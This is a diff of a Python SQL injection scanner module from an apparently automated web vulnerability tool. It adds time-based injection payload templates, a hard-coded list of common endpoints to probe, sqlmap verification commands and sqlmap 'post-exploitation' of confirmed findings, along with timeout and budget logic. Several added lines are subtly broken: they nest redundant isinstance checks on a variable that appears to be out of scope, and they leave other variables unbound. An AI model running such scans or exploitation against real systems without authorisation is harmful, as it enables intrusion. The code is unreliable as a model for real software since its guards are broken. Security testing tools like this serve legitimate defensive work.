+            payload_objects = self._payload_library.get_payload_objects(
+                PayloadCategory.SQLI,
+                db_type=db_type,
+            )
+            # Filter for time-based payloads
+            time_payloads = []
+            for p in payload_objects:
+                if "time-based" in p.tags or "blind" in p.tags:
+                    detected_db = p.db_type or "generic"
+                    # Convert SLEEP(5) patterns to {delay} template
+                    payload_template = p.raw
+                    for delay_val in ["5", "3", "10"]:
+                        payload_template = payload_template.replace(f"SLEEP({delay_val})", "SLEEP({delay})")
+                        payload_template = payload_template.replace(f"pg_sleep({delay_val})", "pg_sleep({delay})")
+                        payload_template = payload_template.replace(f"'0:0:{delay_val}'", "'0:0:{delay}'")
+                    time_payloads.append((payload_template, detected_db, p.description.replace(" ", "_").lower()))
+                    if len(time_payloads) >= max_payloads:
+                        break
+            return time_payloads if time_payloads else self.TIME_PAYLOADS[:max_payloads]
+        except Exception as e:
+            logger.debug(f"[SQLi] PayloadLibrary error, using fallback: {e}")
+            return self.TIME_PAYLOADS[:max_payloads]
+
+    def _time_limit_exceeded(self) -> bool:
+        """
+        Check if scan time limit has been exceeded.
+
+        TIMEOUT-FIX 2026-02-18: Ensures all phases check the limit, not just endpoint loop.
+        See auditdocs/SQLI_CMDI_TIMEOUT_AUDIT_2026-02-18.md
+
+        Returns:
+            True if time limit exceeded, False otherwise.
+        """
+        if self._scan_start_time == 0:
+            return False
+        elapsed = time.time() - self._scan_start_time
+        if elapsed > self._max_total_time:
+            logger.info(
+                f"[SQLi] Time limit exceeded ({elapsed:.0f}s > {self._max_total_time:.0f}s), "
+                f"stopping with {len(self._progressive_findings)} findings"
+            )
+            return True
+        return False
 
     async def _run_sqlmap_exploitation(
         self,
@@ -1047,16 +1642,18 @@ class SQLiScanner(ScanModule):
                     # Enhance finding with sqlmap results
                     sqlmap_data = self._parse_sqlmap_results(result)
 
-                    if sqlmap_data.get("confirmed"):
-                        finding["confidence"] = 100.0
-                        finding["severity"] = "CRITICAL"
+                    if isinstance(asset_data, dict):
+                        if sqlmap_data.get("confirmed"):
+                            finding["confidence"] = 100.0
+                            finding["severity"] = "CRITICAL"
 
-                        # Add POC section - MANUAL commands only (not auto-executed)
-                        poc = finding.get("metadata", {}).get("poc", {})
+                            # Add POC section - MANUAL commands only (not auto-executed)
+                            poc = finding.get("metadata", {}).get("poc", {})
 
-                        # SAFE: Verification command only
-                        poc["sqlmap_verify_command"] = f"sqlmap -u '{url}' --batch --level=3 --risk=2"
-                        poc["database_type"] = sqlmap_data.get("db_type", "unknown")
+                            # SAFE: Verification command only
+                            poc["sqlmap_verify_command"] = f"sqlmap -u '{url}' --batch --level=3 --risk=2"
+                        if isinstance(asset_data, dict):
+                            poc["database_type"] = sqlmap_data.get("db_type", "unknown")
 
                         # EDUCATIONAL: Show what COULD be done (requires consent)
                         poc["manual_exploitation_steps"] = [
@@ -1114,22 +1711,28 @@ class SQLiScanner(ScanModule):
             metadata = finding.get("metadata", {})
 
             if finding.get("type") == "sql_injection":
-                data["confirmed"] = True
+                if isinstance(asset_data, dict):
+                    data["confirmed"] = True
 
-            if metadata.get("database"):
-                data["db_type"] = metadata["database"]
+            if isinstance(asset_data, dict):
+                if metadata.get("database"):
+                    if isinstance(asset_data, dict):
+                        data["db_type"] = metadata["database"]
 
             # Parse log excerpt for additional info
-            log = metadata.get("log_excerpt", "")
+            if isinstance(asset_data, dict):
+                log = metadata.get("log_excerpt", "")
             if log:
                 # Extract database names
                 db_matches = re.findall(r"available databases\s*\[\d+\]:\s*\n(.*?)(?:\n\n|\Z)", log, re.DOTALL)
                 if db_matches:
-                    data["databases"] = [db.strip() for db in db_matches[0].split("\n") if db.strip().startswith("[*]")]
+                    if isinstance(asset_data, dict):
+                        data["databases"] = [db.strip() for db in db_matches[0].split("\n") if db.strip().startswith("[*]")]
 
                 # Extract injectable parameters
                 param_matches = re.findall(r"Parameter: ([^\s]+)", log)
-                data["injectable_params"] = list(set(param_matches))
+                if isinstance(asset_data, dict):
+                    data["injectable_params"] = list(set(param_matches))
 
         return data
 
@@ -1144,35 +1747,187 @@ class SQLiScanner(ScanModule):
         rate_limiter: RateLimiter,
     ) -> dict[str, Any]:
         """Execute comprehensive SQLi scan."""
+        # THEME-9: Initialize budget tracking to prevent cognitive saturation
+        self.init_budget()
+
+        # SECOND-ORDER (2026-02-20): Initialize tracker for cross-endpoint detection
+        self._init_second_order_tracker()
+
+        # Store rate limiter for use in detection methods
+        self._rate_limiter = rate_limiter
+        self._host = host
+        # PERF-FIX 2026-02-20: Store asset_data for intelligent payload selection
+        self._asset_data = asset_data
+
         # Reset progressive findings for this scan
         self._progressive_findings = []
         findings: list[dict[str, Any]] = []
 
-        endpoints = asset_data.get("endpoints", [])
-        forms = asset_data.get("forms", [])
+        # DIAG 2026-03-02: Log scan entry with input summary for debugging silent failures
+        logger.warning(f"[SQLi] SCAN START — host={host}")
 
-        # AUTH CONTEXT: Use authentication for testing protected endpoints
-        auth_context = asset_data.get("auth_context")
-        if auth_context and hasattr(auth_context, "auth_headers") and auth_context.auth_headers:
-            self._auth_headers = auth_context.auth_headers
-            logger.info(f"[SQLi] Using authenticated session ({auth_context.method})")
-        else:
-            self._auth_headers = {}
+        # Initialize with defaults first (defensive)
+        endpoints: list[str] = []
+        forms: list[dict] = []
+
+        if isinstance(asset_data, dict):
+            endpoints = asset_data.get("endpoints", [])
+            forms = asset_data.get("forms", [])
+            logger.warning(f"[SQLi] Inputs: {len(endpoints)} endpoints, {len(forms)} forms")
+
+        # SCAN CONTEXT: Unified access to auth, response validation, training app awareness
+        self._ctx = ScanContext(asset_data)
+        self._ctx.log_context_status()
+
+        # Auth headers from context (cleaner than manual extraction)
+        self._auth_headers = self._ctx.auth_headers
+        if self._ctx.has_auth:
+            logger.info(f"[SQLi] Using authenticated session ({self._ctx.auth_method})")
+
+        # STACK PROFILE: Use tech-specific payloads when available
+        # RuntimeAwarenessEngine provides database-specific injection payloads
+        if isinstance(asset_data, dict):
+            runtime_engine = asset_data.get("runtime_engine")
+        if isinstance(asset_data, dict):
+            stack_profile = asset_data.get("stack_profile")
+        self._stack_specific_payloads: list[str] = []
+        if runtime_engine and stack_profile:
+            try:
+                db_payloads = runtime_engine.get_sqli_payloads(stack_profile)
+                if db_payloads:
+                    self._stack_specific_payloads = db_payloads
+                    db_type = stack_profile.get("database", "unknown") if isinstance(stack_profile, dict) else getattr(stack_profile, "database", "unknown")
+                    logger.info(f"[SQLi] Using {len(db_payloads)} stack-specific payloads for {db_type}")
+            except Exception as e:
+                logger.debug(f"[SQLi] Could not get stack-specific payloads: {e}")
 
         # ENHANCEMENT: Get parameters discovered by arjun for targeted testing
-        tool_discovered_params = asset_data.get("tool_discovered_params", {})
+        if isinstance(asset_data, dict):
+            tool_discovered_params = asset_data.get("tool_discovered_params") or {}
         if tool_discovered_params:
             logger.info(f"[SQLi] Using {len(tool_discovered_params)} parameter sets discovered by arjun")
 
+        # NEW: Get endpoint params from metadata discovery (e.g., VulnerableApp /scanner)
+        endpoint_params = {}
+        vuln_type_hints = {}
+        if isinstance(asset_data, dict):
+            endpoint_params = asset_data.get("endpoint_params", {})
+            vuln_type_hints = asset_data.get("vuln_type_hints", {})
+
+        # ENHANCEMENT 2026-02-20: Add metadata-discovered SQLi endpoints to urls list EARLY
+        # This ensures they are tested in the main phases, not just at the end
+        sqli_hint_types = {"SQL_INJECTION", "ERROR_BASED_SQL_INJECTION", "BLIND_SQL_INJECTION",
+                          "UNION_BASED_SQL_INJECTION", "SQLI", "SECOND_ORDER_SQL_INJECTION"}
+        sqli_param_names = {"id", "user", "username", "name", "query", "search", "q", "order", "sort"}
+        metadata_urls_added = 0
+
+        for ep_url, hints in vuln_type_hints.items():
+            # Check if this endpoint has SQLi vulnerability hints
+            has_sqli_hint = any("SQL" in h.upper() for h in hints)
+            if not has_sqli_hint:
+                # Also check param names
+                params = endpoint_params.get(ep_url, [])
+                has_sqli_hint = any(p.lower() in sqli_param_names for p in params)
+
+            if has_sqli_hint:
+                params = endpoint_params.get(ep_url, ["id", "user", "query", "search"])
+                for param in params[:3]:  # Test top 3 params
+                    test_url = f"{ep_url}?{param}=1" if "?" not in ep_url else f"{ep_url}&{param}=1"
+                    if test_url not in endpoints:
+                        endpoints.append(test_url)
+                        metadata_urls_added += 1
+
+        if metadata_urls_added > 0:
+            logger.info(f"[SQLi] Added {metadata_urls_added} metadata-discovered URLs for early testing")
+
         # Get shared findings store for inter-module communication
-        shared_store = asset_data.get("shared_findings_store")
+        if isinstance(asset_data, dict):
+            shared_store = asset_data.get("shared_findings_store")
+
+        # OOB ENGINE (2026-02-12): For blind SQLi detection via DNS/HTTP callbacks
+        self._oob_engine = None
+        if _OOB_AVAILABLE and isinstance(asset_data, dict):
+            self._oob_engine = asset_data.get("oob_engine")
+            if self._oob_engine:
+                logger.info("[SQLi] OOB Engine available for blind SQLi detection")
+
+        # FIX 2026-02-12: Add common GET search endpoints even if crawler missed them
+        # These are high-value SQLi targets that should always be tested
+        # FIX 2026-02-16: GENERALIZED for real-world apps, not lab-specific
+        # FIX 2026-02-18: Skip for training apps - they have specific known endpoints
+        is_training_app = isinstance(asset_data, dict) and asset_data.get("is_training_app", False)
+
+        if not is_training_app:
+            base_url = f"http{'s' if 'https' in host.lower() else ''}://{host}" if not host.startswith("http") else host
+            common_get_endpoints = [
+                # === SEARCH ENDPOINTS (LIKE context - highest SQLi probability) ===
+                f"{base_url}/search?q=test",
+                f"{base_url}/api/search?q=test",
+                f"{base_url}/api/search?query=test",
+                f"{base_url}/api/v1/search?q=test",
+                f"{base_url}/api/v2/search?q=test",
+                f"{base_url}/rest/search?q=test",
+                f"{base_url}/graphql?query=test",  # GraphQL can have SQLi
+                f"{base_url}/products/search?q=test",
+                f"{base_url}/items/search?q=test",
+                f"{base_url}/users/search?q=test",
+
+                # === ID-BASED LOOKUPS (WHERE id= context) ===
+                f"{base_url}/api/users?id=1",
+                f"{base_url}/api/user?id=1",
+                f"{base_url}/api/products?id=1",
+                f"{base_url}/api/items?id=1",
+                f"{base_url}/api/orders?id=1",
+                f"{base_url}/api/v1/users/1",
+                f"{base_url}/api/v1/products/1",
+                f"{base_url}/users/1",
+                f"{base_url}/products/1",
+                f"{base_url}/orders/1",
+                f"{base_url}/profile?id=1",
+                f"{base_url}/account?id=1",
+
+                # === FILTER/SORT ENDPOINTS (ORDER BY context) ===
+                f"{base_url}/api/products?sort=name",
+                f"{base_url}/api/items?order_by=price",
+                f"{base_url}/api/users?filter=active",
+                f"{base_url}/api/data?column=id&dir=asc",
+                f"{base_url}/list?sort=date",
+
+                # === LOGIN/AUTH ENDPOINTS (bypass potential) ===
+                # NOTE: /auth and /api/auth removed — they collide with JSON API
+                # endpoint patterns (regex r'/auth') and get tested before the
+                # correct framework-specific paths like /rest/user/login.
+                # Login endpoints are already covered by common_json_endpoints.
+                f"{base_url}/login?user=test",
+                f"{base_url}/api/login?email=test",
+
+                # === CATEGORY/LISTING ENDPOINTS ===
+                f"{base_url}/category?id=1",
+                f"{base_url}/categories?type=test",
+                f"{base_url}/api/categories?name=test",
+                f"{base_url}/products?category=1",
+                f"{base_url}/items?type=test",
+
+                # === PAGINATION ENDPOINTS ===
+                f"{base_url}/api/data?page=1&limit=10",
+                f"{base_url}/api/list?offset=0&count=10",
+            ]
+
+            existing_urls = {e.split("?")[0].lower() if "?" in e else e.lower() for e in endpoints}
+            for get_ep in common_get_endpoints:
+                ep_base = get_ep.split("?")[0].lower()
+                if ep_base not in existing_urls:
+                    endpoints.insert(0, get_ep)  # Priority: test these first
+                    logger.debug(f"[SQLi] Added common GET endpoint: {get_ep}")
+        else:
+            # Training apps have specific known endpoints - log that we're using them
+            logger.info(f"[SQLi] Training app detected - skipping generic endpoint injection, using {len(endpoints)} known endpoints")
 
         # CROSS-MODULE TARGETING: Add endpoints where other modules found vulns
         # If XSS/NoSQL/SSTI found a vulnerable parameter, it accepts user input → test for SQLi too
         if shared_store:
-            from utils.shared_findings_store import VulnType
             existing_urls = {e.split("?")[0] if "?" in e else e for e in endpoints}
-            cross_module_types = [VulnType.XSS, VulnType.NOSQL_INJECTION, VulnType.SSTI, VulnType.COMMAND_INJECTION]
+            cross_module_types = [StoreVulnType.XSS, StoreVulnType.NOSQL_INJECTION, StoreVulnType.SSTI, StoreVulnType.COMMAND_INJECTION]
             for vtype in cross_module_types:
                 for sf in shared_store.get_findings_by_type(vtype):
                     if sf.endpoint and sf.endpoint not in existing_urls:
@@ -1182,106 +1937,314 @@ class SQLiScanner(ScanModule):
                         endpoints.append(url)
                         logger.debug(f"[SQLi] Cross-module target added from {sf.module}: {url}")
 
+        # ═══════════════════════════════════════════════════════════════════════════
+        # COVERAGE TRACKING: Report what was/wasn't tested for meta-vision
+        # ═══════════════════════════════════════════════════════════════════════════
+        endpoints_tested = 0
+        endpoints_skipped = 0
+
+        # TIMEOUT-FIX 2026-02-12: Initialize progress tracking
+        self._scan_start_time = time.time()
+        self._endpoints_without_findings = 0
+        self._thoroughness_reduced = False
+
+        # ═══════════════════════════════════════════════════════════════════════════
+        # PRIORITY: Test JSON API endpoints FIRST (login, auth, registration)
+        # These are the highest-value SQLi targets — test before URL params
+        # so they're not skipped due to time limit exhaustion.
+        # ═══════════════════════════════════════════════════════════════════════════
+        json_api_endpoints = self._identify_json_endpoints(host, endpoints)
+        if json_api_endpoints:
+            logger.info(f"[SQLi] Testing {len(json_api_endpoints)} JSON API endpoints first (login/auth priority)")
+            for endpoint_info in json_api_endpoints:
+                if self._time_limit_exceeded():
+                    break
+                await rate_limiter.acquire(host)
+                try:
+                    result = await self._test_json_endpoint_sqli(host, endpoint_info)
+                    if result:
+                        findings.extend(result)
+                        self._progressive_findings.extend(result)
+                        logger.info(f"[SQLi] Found JSON SQLi in {endpoint_info['url']}")
+                except Exception as e:
+                    logger.debug(f"Error testing JSON endpoint: {e}")
+
+        # DIAG 2026-03-02: Log phase completion
+        elapsed_json = time.time() - self._scan_start_time
+        logger.warning(f"[SQLi] JSON phase done: {len(findings)} findings, {elapsed_json:.0f}s elapsed, time_exceeded={self._time_limit_exceeded()}")
+
         # Test URL parameters
-        for endpoint in endpoints:
+
+        # PERF-FIX 2026-02-12: Limit endpoints to prevent timeout in full scans
+        endpoints_to_test = endpoints[:self._max_endpoints]
+        if len(endpoints) > self._max_endpoints:
+            logger.info(f"[SQLi] Limiting endpoints from {len(endpoints)} to {self._max_endpoints}")
+
+        # FIX 2026-02-12: Filter out static assets BEFORE testing
+        # JS/CSS/image files cannot have SQLi - testing them wastes time and creates FPs
+        try:
+            from utils.static_asset_filter import filter_static_assets, get_static_asset_count
+            static_count = get_static_asset_count(endpoints_to_test)
+            if static_count > 0:
+                endpoints_to_test = filter_static_assets(endpoints_to_test)
+                logger.info(f"[SQLi] Filtered {static_count} static assets (JS/CSS/images) - cannot have SQLi")
+        except ImportError:
+            logger.debug("[SQLi] Static asset filter not available")
+
+        for endpoint in endpoints_to_test:
+            # PERF-FIX 2026-02-12: Check total time limit
+            elapsed = time.time() - self._scan_start_time
+            if elapsed > self._max_total_time:
+                logger.info(f"[SQLi] Total time limit reached ({elapsed:.0f}s > {self._max_total_time}s), stopping")
+                break
+
+            # THEME-9: Check budget before testing
+            if not self.can_make_request():
+                logger.info(f"[SQLi] Request budget exhausted, stopping endpoint tests")
+                self.track_skip(endpoint, "BUDGET_EXHAUSTED", "sqli", "Module request limit reached")
+                break
+
+            # TIMEOUT-FIX 2026-02-12: Early exit if no progress after many endpoints
+            # FIX 2026-03-02: Guard with flag — was firing on every iteration after threshold.
+            if self._endpoints_without_findings >= self._max_no_progress_endpoints and not self._thoroughness_reduced:
+                self._thoroughness_reduced = True
+                logger.info(f"[SQLi] No findings after {self._endpoints_without_findings} endpoints, reducing thoroughness")
+                # Reduce payload counts for remaining endpoints
+                self.max_time_payloads = 2
+                self.max_time_mutations = 2
+                self.max_error_payloads = 5
+
             await rate_limiter.acquire(host)
             try:
-                result = await self._test_endpoint_godmode(host, endpoint)
+                # TIMEOUT-FIX 2026-02-12: Per-endpoint timeout to prevent single endpoint blocking
+                result = await asyncio.wait_for(
+                    self._test_endpoint_godmode(host, endpoint),
+                    timeout=self.endpoint_timeout
+                )
                 if result:
-                    findings.extend(result)
-                    self._progressive_findings.extend(result)  # Save progressively
+                    # THEME-9: Check finding budget and record hypothesis
+                    for finding in result:
+                        if not self.can_add_finding():
+                            logger.info(f"[SQLi] Finding budget exhausted, skipping additional findings")
+                            break
+                        findings.append(finding)
+                        self._progressive_findings.append(finding)
+                        # Record hypothesis for cross-module coordination
+                        param = finding.get("metadata", {}).get("param", "")
+                        if param:
+                            self.record_hypothesis(endpoint, param, "injectable", True, "SQLi confirmed")
+                    self.track_test(endpoint, "sql_injection", payloads_sent=5, found_vulnerability=True, depth="THOROUGH")
+                    self._endpoints_without_findings = 0  # Reset on finding
+                else:
+                    self.track_test(endpoint, "sql_injection", payloads_sent=5, found_vulnerability=False, depth="THOROUGH")
+                    self._endpoints_without_findings += 1
+                endpoints_tested += 1
+            except asyncio.TimeoutError:
+                logger.warning(f"[SQLi] Endpoint timeout after {self.endpoint_timeout}s: {endpoint}")
+                self.track_skip(endpoint, "TIMEOUT", "sqli", f"Endpoint test exceeded {self.endpoint_timeout}s limit")
+                endpoints_skipped += 1
+                self._endpoints_without_findings += 1
+            except httpx.HTTPStatusError as e:
+                if e.response.status_code == 429:
+                    self.track_rate_limited(endpoint, "sql_injection")
+                    endpoints_skipped += 1
+                elif e.response.status_code in (401, 403):
+                    self.track_auth_required(endpoint, "sql_injection")
+                    endpoints_skipped += 1
+                else:
+                    logger.debug(f"Error testing endpoint: {e}")
             except Exception as e:
                 logger.debug(f"Error testing endpoint: {e}")
         
         # Test forms
-        for form in forms:
+        # TIMEOUT-FIX 2026-02-18: Check time limit before forms phase
+        if self._time_limit_exceeded():
+            logger.info("[SQLi] Skipping forms phase due to time limit")
+        else:
+            for form in forms:
+                if self._time_limit_exceeded():
+                    break
+                await rate_limiter.acquire(host)
+                try:
+                    result = await self._test_form_godmode(host, form)
+                    if result:
+                        findings.extend(result)
+                        self._progressive_findings.extend(result)  # Save progressively
+                except Exception as e:
+                    logger.debug(f"Error testing form: {e}")
+
+        # NOTE: JSON API endpoints (login, auth) already tested at scan start (priority phase)
+
+        # ENHANCEMENT: Test parameters discovered by arjun (Linux tools integration)
+        # These are hidden parameters that wouldn't be found by normal crawling
+        # TIMEOUT-FIX 2026-02-18: Check time limit before arjun phase
+        if self._time_limit_exceeded():
+            logger.info("[SQLi] Skipping arjun params phase due to time limit")
+        else:
+            arjun_tested = 0
+            for endpoint_url, params in tool_discovered_params.items():
+                if self._time_limit_exceeded():
+                    break
+                if not params:
+                    continue
+
+                # Skip if endpoint already has SQLi finding (inter-module optimization)
+                if shared_store and shared_store.has_vulnerability(endpoint_url, "sql_injection"):
+                    logger.debug(f"[SQLi] Skipping {endpoint_url} - already has SQLi finding")
+                    continue
+
+                await rate_limiter.acquire(host)
+                try:
+                    # Build URL with discovered parameters for testing
+                    for param in params[:10]:  # Limit to 10 params per endpoint
+                        test_url = f"{endpoint_url}?{param}=1"
+                        result = await self._test_endpoint_godmode(host, test_url)
+                        if result:
+                            # Mark as arjun-discovered in metadata
+                            for finding in result:
+                                if isinstance(finding, dict):
+                                    finding.setdefault("metadata", {})
+                                    finding["metadata"]["discovered_by"] = "arjun"
+                                    finding["metadata"]["hidden_parameter"] = param
+                            findings.extend(result)
+                            self._progressive_findings.extend(result)
+                            arjun_tested += 1
+                except Exception as e:
+                    logger.debug(f"Error testing arjun-discovered param: {e}")
+
+            if arjun_tested > 0:
+                logger.info(f"[SQLi] Tested {arjun_tested} arjun-discovered parameters")
+
+        # ENHANCEMENT: Test metadata-discovered endpoints (VulnerableApp /scanner, etc.)
+        if self._time_limit_exceeded():
+            logger.info("[SQLi] Skipping metadata params phase due to time limit")
+        else:
+            metadata_tested = 0
+            # Filter endpoints that have SQLi hints
+            sqli_endpoints = {}
+            for ep_url, params in endpoint_params.items():
+                hints = vuln_type_hints.get(ep_url, [])
+                # Check if this endpoint has SQL injection vulnerability hints
+                if any("SQL" in h.upper() for h in hints):
+                    sqli_endpoints[ep_url] = params
+                elif params:  # Also test endpoints with SQLi-related params
+                    sqli_param_names = {"id", "user", "username", "query", "search", "q", "name", "order", "sort"}
+                    if any(p.lower() in sqli_param_names for p in params):
+                        sqli_endpoints[ep_url] = params
+
+            if sqli_endpoints:
+                logger.info(f"[SQLi] Testing {len(sqli_endpoints)} metadata-discovered endpoints")
+
+                for ep_url, params in sqli_endpoints.items():
+                    if self._time_limit_exceeded():
+                        break
+
+                    # Skip if already has SQLi finding
+                    if shared_store and shared_store.has_vulnerability(ep_url, "sql_injection"):
+                        continue
+
+                    await rate_limiter.acquire(host)
+                    try:
+                        for param in params[:5]:  # Test first 5 params
+                            test_url = f"{ep_url}?{param}=1"
+                            result = await self._test_endpoint_godmode(host, test_url)
+                            if result:
+                                for finding in result:
+                                    if isinstance(finding, dict):
+                                        finding.setdefault("metadata", {})
+                                        finding["metadata"]["discovered_by"] = "metadata_endpoint"
+                                findings.extend(result)
+                                self._progressive_findings.extend(result)
+                                metadata_tested += 1
+                    except Exception as e:
+                        logger.debug(f"Error testing metadata-discovered param: {e}")
+
+                if metadata_tested > 0:
+                    logger.info(f"[SQLi] Found {metadata_tested} vulns in metadata-discovered endpoints")
+
+        # ====================================================================
+        # PATH PARAMETER TESTING (2026-02-12)
+        # Tests SQLi in URL path segments like /api/users/123 or /products/uuid
+        # ====================================================================
+        # TIMEOUT-FIX 2026-02-18: Check time limit before path param phase
+        if self._time_limit_exceeded():
+            logger.info("[SQLi] Skipping path param phase due to time limit")
+        else:
+            path_endpoints_tested = 0
+            # Identify endpoints with potential path parameters
+            path_param_endpoints = [
+                e for e in endpoints_to_test
+                if re.search(r'/\d+(?:/|$)|/[a-f0-9]{8}-[a-f0-9]{4}|/[a-f0-9]{24}(?:/|$)', e, re.I)
+            ]
+            for endpoint in path_param_endpoints[:20]:  # Limit to prevent timeout
+                if self._time_limit_exceeded():
+                    break
+                # Check budget
+                if not self.can_make_request():
+                    logger.info(f"[SQLi] Budget exhausted, stopping path param tests")
+                    break
+
+                await rate_limiter.acquire(host)
+                try:
+                    result = await asyncio.wait_for(
+                        self._test_path_param_sqli(host, endpoint),
+                        timeout=15  # 15s timeout per path param test
+                    )
+                    if result:
+                        findings.extend(result)
+                        self._progressive_findings.extend(result)
+                        self.track_test(endpoint, "sqli_path_param", payloads_sent=12, found_vulnerability=True, depth="THOROUGH")
+                    else:
+                        self.track_test(endpoint, "sqli_path_param", payloads_sent=12, found_vulnerability=False, depth="THOROUGH")
+                    path_endpoints_tested += 1
+                except asyncio.TimeoutError:
+                    logger.debug(f"[SQLi] Path param test timeout: {endpoint}")
+                    self.track_skip(endpoint, "TIMEOUT", "sqli_path_param", "Path param test exceeded 15s")
+                except Exception as e:
+                    logger.debug(f"[SQLi] Path param test error: {e}")
+
+            if path_endpoints_tested > 0:
+                logger.info(f"[SQLi] Tested {path_endpoints_tested} endpoints for path parameter SQLi")
+
+        # Test headers
+        # TIMEOUT-FIX 2026-02-18: Check time limit before headers phase
+        if not self._time_limit_exceeded():
             await rate_limiter.acquire(host)
             try:
-                result = await self._test_form_godmode(host, form)
+                result = await self._test_headers_godmode(host)
                 if result:
                     findings.extend(result)
                     self._progressive_findings.extend(result)  # Save progressively
             except Exception as e:
-                logger.debug(f"Error testing form: {e}")
+                logger.debug(f"Error testing headers: {e}")
 
-        # CRITICAL: Test JSON API endpoints (login, registration, etc.)
-        # These are POST endpoints that receive JSON body, not URL params
-        json_api_endpoints = self._identify_json_endpoints(host, endpoints)
-        for endpoint_info in json_api_endpoints:
-            await rate_limiter.acquire(host)
-            try:
-                result = await self._test_json_endpoint_sqli(host, endpoint_info)
-                if result:
-                    findings.extend(result)
-                    self._progressive_findings.extend(result)
-                    logger.info(f"[SQLi] Found JSON SQLi in {endpoint_info['url']}")
-            except Exception as e:
-                logger.debug(f"Error testing JSON endpoint: {e}")
-
-        # ENHANCEMENT: Test parameters discovered by arjun (Linux tools integration)
-        # These are hidden parameters that wouldn't be found by normal crawling
-        arjun_tested = 0
-        for endpoint_url, params in tool_discovered_params.items():
-            if not params:
-                continue
-
-            # Skip if endpoint already has SQLi finding (inter-module optimization)
-            if shared_store and shared_store.has_vulnerability(endpoint_url, "sql_injection"):
-                logger.debug(f"[SQLi] Skipping {endpoint_url} - already has SQLi finding")
-                continue
-
-            await rate_limiter.acquire(host)
-            try:
-                # Build URL with discovered parameters for testing
-                for param in params[:10]:  # Limit to 10 params per endpoint
-                    test_url = f"{endpoint_url}?{param}=1"
-                    result = await self._test_endpoint_godmode(host, test_url)
-                    if result:
-                        # Mark as arjun-discovered in metadata
-                        for finding in result:
-                            if isinstance(finding, dict):
-                                finding.setdefault("metadata", {})
-                                finding["metadata"]["discovered_by"] = "arjun"
-                                finding["metadata"]["hidden_parameter"] = param
-                        findings.extend(result)
-                        self._progressive_findings.extend(result)
-                        arjun_tested += 1
-            except Exception as e:
-                logger.debug(f"Error testing arjun-discovered param: {e}")
-
-        if arjun_tested > 0:
-            logger.info(f"[SQLi] Tested {arjun_tested} arjun-discovered parameters")
-        
-        # Test headers
-        await rate_limiter.acquire(host)
-        try:
-            result = await self._test_headers_godmode(host)
-            if result:
-                findings.extend(result)
-                self._progressive_findings.extend(result)  # Save progressively
-        except Exception as e:
-            logger.debug(f"Error testing headers: {e}")
-        
         # Test cookies
-        await rate_limiter.acquire(host)
-        try:
-            result = await self._test_cookies_godmode(host)
-            if result:
-                findings.extend(result)
-                self._progressive_findings.extend(result)  # Save progressively
-        except Exception as e:
-            logger.debug(f"Error testing cookies: {e}")
-        
-        # Test GraphQL endpoints
-        graphql_endpoints = [e for e in endpoints if 'graphql' in e.lower()]
-        for endpoint in graphql_endpoints[:2]:
+        # TIMEOUT-FIX 2026-02-18: Check time limit before cookies phase
+        if not self._time_limit_exceeded():
             await rate_limiter.acquire(host)
             try:
-                result = await self._test_graphql_godmode(endpoint)
+                result = await self._test_cookies_godmode(host)
                 if result:
                     findings.extend(result)
+                    self._progressive_findings.extend(result)  # Save progressively
             except Exception as e:
-                logger.debug(f"Error testing GraphQL: {e}")
+                logger.debug(f"Error testing cookies: {e}")
+
+        # Test GraphQL endpoints
+        # FIX 2026-02-11: Increased from [:2] to [:5] for better GraphQL coverage
+        # TIMEOUT-FIX 2026-02-18: Check time limit before GraphQL phase
+        if not self._time_limit_exceeded():
+            graphql_endpoints = [e for e in endpoints if 'graphql' in e.lower()]
+            for endpoint in graphql_endpoints[:5]:
+                if self._time_limit_exceeded():
+                    break
+                await rate_limiter.acquire(host)
+                try:
+                    result = await self._test_graphql_godmode(endpoint)
+                    if result:
+                        findings.extend(result)
+                except Exception as e:
+                    logger.debug(f"Error testing GraphQL: {e}")
 
         # ====================================================================
         # POST-EXPLOITATION: Run sqlmap on confirmed SQLi vulnerabilities
@@ -1290,11 +2253,50 @@ class SQLiScanner(ScanModule):
             logger.info("[SQLi] Running sqlmap post-exploitation on confirmed findings")
             findings = await self._run_sqlmap_exploitation(findings)
 
+        # ====================================================================
+        # CROSS-MODULE SHARING: Add findings to SharedFindingsStore
+        # Other modules (XSS, SSRF, SSTI) can target these vulnerable endpoints
+        # ====================================================================
+        # FIX 2026-02-12: Moved this block OUTSIDE the if statement (was incorrectly indented)
+        if findings:
+            try:
+                store = SharedFindingsStore.get_instance()
+                for f in findings:
+                    if not isinstance(f, dict):
+                        continue
+                    metadata = f.get("metadata", {})
+
+                    endpoint = f.get("matched_at") or metadata.get("url", "")
+                    parameter = metadata.get("param_name") or metadata.get("vulnerable_param", "")
+                    database = metadata.get("database_type", "")
+
+                    await store.add_finding(
+                        {
+                            "type": StoreVulnType.SQL_INJECTION,
+                            "endpoint": endpoint,
+                            "severity": f.get("severity", "HIGH"),
+                            "parameter": parameter,
+                            "database": database,
+                        },
+                        module="sqli",
+                    )
+
+                logger.debug(f"[SQLi] Shared {len(findings)} findings to cross-module store")
+            except Exception as e:
+                logger.debug(f"[SQLi] Could not share findings: {e}")
+
+        # DIAG 2026-03-02: Log scan exit with summary
+        total_elapsed = time.time() - self._scan_start_time
+        logger.warning(f"[SQLi] SCAN END — {len(findings)} findings in {total_elapsed:.0f}s, "
+                       f"endpoints_tested={endpoints_tested}, endpoints_skipped={endpoints_skipped}, "
+                       f"time_exceeded={self._time_limit_exceeded()}, thoroughness_reduced={self._thoroughness_reduced}")
+
         return {
             "module": self.name,
             "version": self.version,
             "findings": findings,
         }
+
     
     async def _get_baseline_cluster(
         self,
@@ -1305,11 +2307,12 @@ class SQLiScanner(ScanModule):
         """Get baseline response cluster and anomaly detector."""
         cluster = ResponseCluster()
         detector = AnomalyDetector(self.baseline_samples)
-        
-        async with httpx.AsyncClient(
+
+        async with get_scan_client(
             timeout=self.timeout,
-            verify=False,
-            http2=True,  # Enable HTTP/2
+            http2=True,
+            custom_headers=self._auth_headers if hasattr(self, "_auth_headers") else None,
+            enable_dedup=False,  # Baseline needs all requests
         ) as client:
             for i in range(self.baseline_samples):
                 try:
@@ -1319,15 +2322,75 @@ class SQLiScanner(ScanModule):
                     else:
                         response = await client.post(url, **kwargs)
                     elapsed = time.time() - start
-                    
+
+                    # JUICE-SHOP-FIX 2026-02-11: DON'T skip login pages for SQLi testing!
+                    # Login endpoints are prime targets for auth bypass SQLi (e.g., ' OR 1=1--)
+                    # The previous filter was blocking /rest/user/login completely
+                    # Only skip if truly a static/error page, NOT login forms
+                    #
+                    # P0-FIX 2026-02-11: Expanded auth patterns and made check more conservative
+                    # Better to test and find FP than to skip and miss SQLi auth bypass
